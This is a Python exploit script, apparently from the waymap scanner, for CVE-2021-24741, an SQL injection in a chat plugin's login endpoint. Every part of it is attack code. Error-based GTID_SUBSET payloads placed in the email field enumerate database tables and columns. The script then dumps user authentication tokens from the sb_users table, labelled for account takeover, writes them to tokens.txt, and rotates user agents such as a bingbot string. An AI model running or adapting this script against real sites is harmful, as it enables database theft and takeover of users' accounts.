# Copyright (c) 2024 waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2021-24741

import requests
import random
from colorama import init, Fore
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init()

red = Fore.RED
green = Fore.GREEN
blue = Fore.BLUE
magenta = Fore.MAGENTA
white = Fore.WHITE
reset = Fore.RESET

class exploit:
    def __init__(self):
        self.cookies = { "sb-updates": "3.3.4" }
        self.user_agents = [
            'Mozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:57.0) Gecko/20100101 Firefox/57.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0',
            'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (iPad; CPU OS 11_2_1 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0 Mobile/15C153 Safari/604.1'
        ]
        self.database = []
        self.tables = []
        self.columns = []
        self.tokens = []
        self.divider = "---------------------"

    def save(self):
        new_file = open("content.txt", "w")
        new_file.write("Tables Found on The Database\n")
        for i in range(len(self.tables)):
            new_file.write(self.tables[i] + "\n")
        new_file.write("\n\nColumns In the Table")
        new_file.write(self.divider + "\n")
        new_file.write(self.tables[0] + '\n')
        new_file.write(self.divider + "\n")
        for i in range(len(self.columns)):
            new_file.write(self.columns[i] + "\n")
        new_file.close()

    def get_tables(self, url):
        print("\n" + blue + self.divider + "\n" + red + "DUMPING TABLES" + "\n" + blue + self.divider)
        i = 0
        while True:
            headers = {
                "User-Agent": random.choice(self.user_agents),
            }
            data = {
                "function": "login", 
                "email": "test\" AND GTID_SUBSET(CONCAT((select table_name from information_schema.tables where table_schema=database() LIMIT {0},1),(SELECT (ELT(9164=9164,0x00))),0x00),9164)-- #".format(i), 
                "password": "test", 
                "login-cookie": '', 
                "language": "false"
            }
            response = requests.post(url, headers=headers, cookies=self.cookies, data=data, verify=False)
            response = response.text
            response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
            response = response.replace('[', '')
            response = response.replace(']', '')
            response = response.replace("'", '')
            response = response.replace('"', '')
            response = response.replace('.', '')
            response = response.replace(' ', '')
            print(magenta + response)
            self.tables.append(response)
            i += 1
            if "success,false" in response:
                self.tables.pop()
                break
        print("Tables Found " + white + str(self.tables))

    def get_columns(self, url):
        lines = 0
        c = 1
        i = 0
        print("\n" + blue + self.divider + "\n" + red + self.tables[0] + "\n" + blue + self.divider)
        while lines < len(self.tables):
            while True:
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                }
                data = {
                    "function": "login",
                    "email": "test\" AND GTID_SUBSET(CONCAT((select column_name from information_schema.columns where table_schema=database() LIMIT {0},1),(SELECT (ELT(9164=9164,0x00))),0x00),9164)-- #".format(i), 
                    "password": "test", 
                    "login-cookie": '', 
                    "language": "false"
                }
                response = requests.post(url, headers=headers, cookies=self.cookies, data=data, verify=False)
                response = response.text
                response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
                response = response.replace('[', '')
                response = response.replace(']', '')
                response = response.replace("'", '')
                response = response.replace('"', '')
                response = response.replace('.', '')
                response = response.replace(' ', '')
                self.columns.append(response)
                i += 1
                if response == "id":
                    self.columns.append(self.divider)
                    self.columns.append(self.tables[c])
                    self.columns.append(self.divider)
                    print("\n" + blue + self.divider + "\n" + red + self.tables[c] + "\n" + blue + self.divider)
                    c = c + 1
                    lines = lines + 1
                if "success,false" in response:
                    self.columns.pop()
                    break
            break

    def get_tokens(self, url, path):
        final_path = path.replace("admin.php", "include/ajax.php")
        final_url = "{0}{1}".format(url, final_path)
        print("\n" + blue + self.divider + "\n" + red + "Dumping Tokens For Account TakeOver" + "\n" + blue + self.divider)
        i = 0
        for i in range(0, 1):
            headers = {
                "User-Agent": random.choice(self.user_agents),
            }
            data = {
                "function": "login",
                "email": "test\" AND GTID_SUBSET(CONCAT(0x746573747465737474657374,(SELECT (ELT(3469=3469,0x74657374))),database()),3469)-- jXft", 
                "password": "test", 
                "login-cookie": '', 
                "language": "false"
            }
            response = requests.post(final_url, headers=headers, cookies=self.cookies, data=data, verify=False)
            response = response.text
            response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
            response = response.replace('testtesttesttest', '')
            response = response.replace('[', '')
            response = response.replace(']', '')
            response = response.replace("'", '')
            response = response.replace('"', '')
            response = response.replace('.', '')
            response = response.replace(' ', '')
            self.database.append(response)

        while True:
            headers = {
                "User-Agent": random.choice(self.user_agents),
            }
            data = {
                "function": "login",
                "email": 'test\" AND GTID_SUBSET(CONCAT(0x546f6b656e3a2020 ,(SELECT MID((IFNULL(CAST(token AS NCHAR),0x00)),1,190) FROM {0}.sb_users ORDER BY token LIMIT {1},1),0x20),7838)-- #'.format(self.database[0], i), 
                "password": "test", 
                "login-cookie": '', 
                "language": "false"
            }
            response = requests.post(final_url, headers=headers, cookies=self.cookies, data=data, verify=False)
            response = response.text
            response = response.replace('"error","db-error","sb_db_get","Malformed GTID set specification', '')
            response = response.replace('[', '')
            response = response.replace(']', '')
            response = response.replace("'", '')
            response = response.replace('"', '')
            response = response.replace('.', '')
            response = response.replace(' ', '')
            self.tokens.append(response)
            i += 1
            if "success,false" in response:
                self.tokens.pop()
                break
            print(blue + response)

        print(red + "\nSaving the Tokens into File")
        print(red + "Tokens Saved Into tokens.txt\n")
        new_file = open("tokens.txt", "w")
        new_file.write(self.divider + "\n")
        new_file.write("Tokens Found on The Database\n")
        new_file.write(self.divider + "\n")
        for i in range(len(self.tokens)):
            new_file.write(self.tokens[i] + "\n")
        new_file.close()

def scan_cve_2021_24741(target):

    exploiter = exploit()
    exploiter.get_tables(target)
    exploiter.get_columns(target)
    exploiter.get_tokens(target, "admin.php")